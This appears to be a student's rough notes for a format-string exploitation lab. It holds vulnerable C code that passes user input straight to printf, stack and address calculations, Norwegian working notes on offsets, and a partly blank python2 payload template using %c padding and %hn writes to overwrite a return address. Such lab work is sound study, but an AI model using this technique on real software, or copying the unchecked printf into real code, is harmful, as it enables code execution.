# Project 6

void calibrate(char * buf) {
    printf("Input calibration parameters:\n")
    fgets(buf, 128, stdin)
    printf("Calibration parameters received:\n")
    printf(buf)
    FILE * f = fopen("params.txt", "w")
    fputs(buf, f)
    fclose(f)
}

int main(int argc, char * argv[]) {
    char buf[128]
    calibrate(buf)
    return 0
}

The adress begins of the shellcode is : 0xffffd7c2
This can be found by placing a breakpoing into the main function,
and then looking at the p argv[0], it will look like garbage at first,
but when you look at the values there you can see it has the same
start as the values in the shellcode.


[4] RIP of main
[4] SFP of main
[n] compiler padding
[128] buf
[4] & buf
[4] RIP of calibrate
[4] SFP of calibrate
[m] compiler padding
# Removed a bunch of shit from here
# since it is finished??
[4] & buf
[4] RIP of printf
[4] SFP of printf
[o] padding?

# Address of shellcode:
0xffffd7c2

# address of buf=
0xffffd5a0

# address of RIP in fprint:
0xffffd55c

# Address of rip calibrate
0xffffd58c + 2 = FFFFD58E
0xff ff d5 8e

x/16x &0xcd58326a
# Fremgangsmåte
Tok avstanden mellom RIP til buff og RIP til printen
Avstanden var 68. Vi vil opp til at pekeren skal være på bufferen. Siden
C går 4 bytes opp av gangen -> 68/4 = 17. Siden printf allerede peker 2 bytes oppover, må
vi gange c med 17-2 = 15.
Slik finner vi også hvor mye søppel som vi må ta minus
(4 A + 4 addresser + 4 A + 4 addresse + 15 C=31)


#!/usr/bin/env python2

##############################################################################
# We recommend fully reading the spec before attempting this question!
##############################################################################

____ = 0  # ignore (makes fill-in-the-blank work)

payload = ''

##############################################################################
# The first thing we need to put into our buffer is what we'll consume down
# below, in each call to %hn: memory addresses that point to the address that
# we want to overwrite with each use of %hn.
##############################################################################

payload += 'A' * 4   # Hint: Word 0 of buffer (consumed by %__u)
payload += '____'    # Hint: Word 1 of buffer (consumed by %hn)

payload += 'A' * 4   # Hint: Word 2 of buffer (consumed by %__u)
payload += '____'    # Hint: Word 3 of buffer (consumed by %hn)

##############################################################################
# Before we dive into the %hn, we need to make sure we bump our printf argument
# pointer up to a point where we have write access to (e.g. somewhere in our
# buffer). We can use the harmless %c to work our way up the stack. After all
# of these %c's are consumed, we should expect our argument pointer to point
# to the first thing in our buffer (as noted above, "Word 0").
##############################################################################

payload += '%c' * ____

##############################################################################
# Now, we're ready to dive into the %hn's. Before each %hn, we need to make sure
# we've printed the total number of bytes correctly; that's what the %__u is
# for. Calculate the number of "remaining" bytes to print by subtracting the
# target value that we want to print from the total number of bytes we've
# printed so far in the exploit. Note that each %c prints one byte.
##############################################################################

FIRST_HALF = ____   # The two most significant bytes of an address
SECOND_HALF = ____  # The two least significant bytes of an address

payload += '%' + str(SECOND_HALF - ____) + 'u'
payload += '%hn'

payload += '%' + str(FIRST_HALF - ____) + 'u'
payload += '%hn'

print(payload + '\n')
